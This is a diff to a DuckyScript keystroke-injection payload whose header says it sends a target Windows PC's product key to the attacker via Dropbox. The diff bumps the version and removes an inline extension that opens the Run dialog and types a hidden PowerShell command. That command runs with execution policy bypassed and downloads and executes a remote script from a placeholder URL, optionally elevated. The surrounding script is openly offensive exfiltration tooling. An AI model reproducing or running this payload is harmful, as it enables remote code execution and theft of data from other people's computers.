@@ -3,7 +3,7 @@ REM_BLOCK DOCUMENTATION
     Author: PlumpyTurkey
     Description: This payload sends you the target PC's Windows product key via Dropbox.
     Target: Windows 10, 11
-    Version: 1.1
+    Version: 1.2
     Category: Exfiltration
 END_REM
 
@@ -106,41 +106,6 @@ EXTENSION WINDOWS_ONLY
         #FAILURE_ATTACKMODE
         STOP_PAYLOAD
     END_IF
-END_EXTENSION
-
-EXTENSION RUN_HOSTED_POWERSHELL
-    REM_BLOCK DOCUMENTATION
-        Title: Run Hosted PowerShell
-        Author: PlumpyTurkey
-        Description: This extension executes a hosted PowerShell script using the Windows Run dialog box.
-        Target: Windows 10, 11
-        Version: 1.0
-    END_REM
-
-    REM Required options:
-    DEFINE #RHP_SCRIPT_URL example.com
-
-    REM Advanced options:
-    DEFINE #RHP_DELAY 2000
-    DEFINE #RHP_ELEVATED_EXECUTION FALSE
-    DEFINE #RHP_DISABLE_AFTER_EXECUTION FALSE
-
-    GUI r
-
-    DELAY #RHP_DELAY
-    STRING PowerShell -W H -EX Bypass "IWR -UseB '#RHP_SCRIPT_URL' | IEX"
-
-    IF_DEFINED_TRUE #RHP_ELEVATED_EXECUTION
-        CTRL SHIFT ENTER
-        DELAY #RHP_DELAY
-        LEFT
-    END_IF_DEFINED
-
-    ENTER
-
-    IF_DEFINED_TRUE #RHP_DISABLE_AFTER_EXECUTION
-        ATTACKMODE OFF
-    END_IF_DEFINED
 END_EXTENSION
 
 RHP_RUN()
